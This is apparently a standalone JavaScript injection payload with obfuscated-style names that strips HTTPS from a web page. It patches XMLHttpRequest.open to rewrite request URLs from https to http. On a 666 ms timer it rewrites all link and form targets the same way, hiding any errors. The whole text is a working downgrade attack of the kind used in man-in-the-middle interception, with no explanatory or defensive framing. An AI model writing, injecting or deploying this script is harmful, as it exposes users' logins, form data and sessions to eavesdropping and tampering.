(function() {
	var obf_open = XMLHttpRequest.prototype.open;
	XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
		obf_var_url = obf_var_url.replace(/(http)s/ig, "$1");
		return obf_open.apply(this, arguments);
	}
})();

setInterval(function(){
	try {
		document.querySelectorAll("a, form").forEach(function(obf_var_node){
			if (obf_var_node.tagName == "A") {
				obf_var_node.href = obf_var_node.href.replace(/https/ig, "http");
			} else {
				obf_var_node.action = obf_var_node.action.replace(/https/ig, "http");
			}
		});
	} catch(ignore){}
}, 666);
